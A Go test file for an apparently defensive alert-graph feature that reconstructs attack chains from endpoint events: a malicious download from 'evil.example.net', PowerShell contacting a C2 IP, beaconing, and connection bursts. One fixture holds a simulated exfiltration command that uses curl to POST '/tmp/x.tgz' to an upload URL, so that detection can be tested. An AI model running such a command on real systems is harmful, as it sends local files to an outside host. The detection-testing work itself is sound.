package api

import (
	"context"
	"testing"
	"time"

	"obsidianwatch/management/internal/store"
)

func downloadFixture() *fakeGraphSrc {
	evSeq = 0
	f := &fakeGraphSrc{alerts: map[string][]int64{}, briefs: map[int64]store.AlertBrief{}}
	dl := `C:\Users\bob\Downloads\invoice.exe`
	chrome := startEv("{CHROME}", "{EXP}", "chrome.exe", -3*time.Hour)
	w := fileEv("{CHROME}", dl, -2*time.Hour)
	w.FileHash = sp("SHA256=AABBCC00112233445566778899AABBCCDDEEFF00112233445566778899AABB")
	mw := fileEv("{CHROME}", dl+":Zone.Identifier", -2*time.Hour+time.Second)
	mw.Raw = []byte(`{"Contents":"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://evil.example.net/invoice.exe\r\n"}`)
	run := startEv("{INV}", "{EXP}", "invoice.exe", -10*time.Minute)
	run.ImagePath = sp(dl)
	run.FileHash = sp("SHA256=aabbcc00112233445566778899aabbccddeeff00112233445566778899aabb")
	f.evs = []store.Event{
		startEv("{EXP}", "{WININIT}", "explorer.exe", -48*time.Hour),
		chrome, w, mw, run,
		startEv("{PS}", "{INV}", "powershell.exe", -9*time.Minute),
		netEv("{PS}", "203.0.113.7", 443, -8*time.Minute),
	}
	f.alerts["a1|{CHROME}"] = []int64{11}
	f.alerts["203.0.113.7"] = []int64{12}
	f.briefs[5] = store.AlertBrief{ID: 5, Title: "Suspicious PowerShell", Category: "Execution", Host: "h1", CreatedAt: t0}
	f.briefs[11] = store.AlertBrief{ID: 11, Title: "Executable downloaded", Category: "Initial Access", Host: "h1", CreatedAt: t0.Add(-2 * time.Hour)}
	f.briefs[12] = store.AlertBrief{ID: 12, Title: "C2 IP contact", Category: "Command and Control", Host: "h2", CreatedAt: t0.Add(-time.Hour)}
	return f
}

func TestAlertGraphDownloadJoinBackward(t *testing.T) {
	f := downloadFixture()
	in := chainInput()
	g, err := BuildAlertGraph(context.Background(), f, in)
	if err != nil {
		t.Fatal(err)
	}
	if nodeByLabel(g, "chrome.exe") == nil {
		t.Fatalf("writer process missing: %+v", g.Nodes)
	}
	file := procNode(g, "invoice.exe")
	var bridge *AGNode
	for i := range g.Nodes {
		if g.Nodes[i].Type == "file" && g.Nodes[i].Role == "bridge" {
			bridge = &g.Nodes[i]
		}
	}
	if bridge == nil || file == nil {
		t.Fatalf("bridge/exec missing: %+v", g.Nodes)
	}
	if bridge.Meta["download_url"] != "https://evil.example.net/invoice.exe" {
		t.Errorf("download url = %q", bridge.Meta["download_url"])
	}
	if bridge.Meta["hash_match"] != "true" {
		t.Errorf("hash not matched")
	}
	chrome := nodeByLabel(g, "chrome.exe")
	if !hasEdge(g, chrome.ID, bridge.ID, "wrote") || !hasEdge(g, bridge.ID, file.ID, "executed") {
		t.Errorf("bridge edges missing")
	}
	if chrome.Role != "origin" {
		t.Errorf("chrome role %q", chrome.Role)
	}
}

func TestAlertGraphDownloadJoinForward(t *testing.T) {
	f := downloadFixture()
	in := chainInput()
	// anchor on the downloader: the run must be found going forward
	in.Anchors = []Anchor{{EntityProcess, "a1|{CHROME}"}}
	g, err := BuildAlertGraph(context.Background(), f, in)
	if err != nil {
		t.Fatal(err)
	}
	inv := procNode(g, "invoice.exe")
	if inv == nil || inv.Role != "executed" {
		t.Fatalf("executed node missing: %+v", inv)
	}
	if nodeByLabel(g, "powershell.exe") == nil {
		t.Errorf("descendants of the executed file should follow")
	}
}

func TestAlertGraphNoJoinWhenWrittenAfterStart(t *testing.T) {
	f := downloadFixture()
	for i := range f.evs {
		if f.evs[i].EventType == "file" {
			f.evs[i].Time = t0.Add(-time.Minute) // after the run started
		}
	}
	g, _ := BuildAlertGraph(context.Background(), f, chainInput())
	if nodeByLabel(g, "chrome.exe") != nil {
		t.Errorf("a write after the exec start must not be joined")
	}
}

func TestAlertGraphCampaign(t *testing.T) {
	f := downloadFixture()
	g, err := BuildAlertGraph(context.Background(), f, chainInput())
	if err != nil {
		t.Fatal(err)
	}
	if len(g.Campaign.Alerts) < 2 || g.Campaign.Alerts[0].ID != 11 {
		t.Errorf("campaign order: %+v", g.Campaign.Alerts)
	}
	// alert 12 shares the C2 IP but sits on another host
	if len(g.Campaign.Related) != 1 || g.Campaign.Related[0].Alert.ID != 12 || g.Campaign.Related[0].SameHost {
		t.Errorf("related: %+v", g.Campaign.Related)
	}
}

func TestDownloadURLAndHashEq(t *testing.T) {
	if hashEq("SHA256=AB"+"CDEF0123456789ABCDEF0123456789AB", "abcdef0123456789abcdef0123456789ab") != true {
		t.Errorf("hashEq case")
	}
	if hashEq("", "") || hashEq("x", "y") {
		t.Errorf("hashEq empty")
	}
	if !userWritableImage(`E:\setup.exe`) || userWritableImage(`C:\Windows\System32\cmd.exe`) {
		t.Errorf("userWritableImage")
	}
}

func procNode(g *AlertGraph, label string) *AGNode {
	for i := range g.Nodes {
		if g.Nodes[i].Type == "process" && g.Nodes[i].Label == label {
			return &g.Nodes[i]
		}
	}
	return nil
}

func TestBeaconNote(t *testing.T) {
	var reg, irr []time.Time
	for i := 0; i < 10; i++ {
		reg = append(reg, t0.Add(time.Duration(i)*60*time.Second+time.Duration(i%3)*time.Second))
	}
	for _, s := range []int{0, 3, 70, 71, 400, 410, 900} {
		irr = append(irr, t0.Add(time.Duration(s)*time.Second))
	}
	if beaconNote(reg) == "" {
		t.Errorf("regular contacts should be a beacon candidate")
	}
	if beaconNote(irr) != "" || beaconNote(reg[:4]) != "" {
		t.Errorf("irregular/short series must not flag")
	}
}

func TestBurstItemsAndBeacon(t *testing.T) {
	evSeq = 0
	f := &fakeGraphSrc{alerts: map[string][]int64{}, briefs: map[int64]store.AlertBrief{}}
	f.evs = []store.Event{startEv("{PS}", "{CMD}", "powershell.exe", -time.Hour), startEv("{CMD}", "{WININIT}", "cmd.exe", -2*time.Hour)}
	for i := 0; i < 12; i++ { // regular beacon to one IP
		f.evs = append(f.evs, netEv("{PS}", "203.0.113.50", 443, -50*time.Minute+time.Duration(i)*time.Minute))
	}
	for i := 0; i < 20; i++ { // many distinct IPs -> burst
		f.evs = append(f.evs, netEv("{PS}", "198.51.100."+itoa(i+1), 80, -30*time.Minute+time.Duration(i*i)*time.Second))
	}
	in := chainInput()
	g, err := BuildAlertGraph(context.Background(), f, in)
	if err != nil {
		t.Fatal(err)
	}
	var burst, beacon *AGNode
	for i := range g.Nodes {
		if g.Nodes[i].Type == "burst" {
			burst = &g.Nodes[i]
		}
		if g.Nodes[i].Label == "203.0.113.50" {
			beacon = &g.Nodes[i]
		}
	}
	if burst == nil || len(burst.Items) != burst.Collapsed {
		t.Fatalf("burst should list all collapsed members: %+v", burst)
	}
	if beacon == nil || beacon.Meta["beacon"] == "" {
		t.Errorf("beacon candidate not flagged: %+v", beacon)
	}
}

func TestGraphCmdlineDestination(t *testing.T) {
	evSeq = 0
	f := &fakeGraphSrc{alerts: map[string][]int64{}, briefs: map[int64]store.AlertBrief{}}
	st := startEv("{PS}", "{CMD}", "curl", -time.Minute)
	st.CommandLine = sp("curl -s -X POST -F file=@/tmp/x.tgz http://example.com/upload")
	f.evs = []store.Event{startEv("{CMD}", "{WININIT}", "bash", -time.Hour), st}
	g, err := BuildAlertGraph(context.Background(), f, chainInput())
	if err != nil {
		t.Fatal(err)
	}
	n := nodeByLabel(g, "example.com")
	if n == nil || n.Meta["source"] == "" {
		t.Fatalf("command-line destination missing: %+v", n)
	}
	var found bool
	for _, e := range g.Edges {
		if e.Target == n.ID && e.Evidence == "cmdline" && e.Confidence < 100 {
			found = true
		}
	}
	if !found {
		t.Errorf("edge must be marked cmdline with reduced confidence")
	}
}
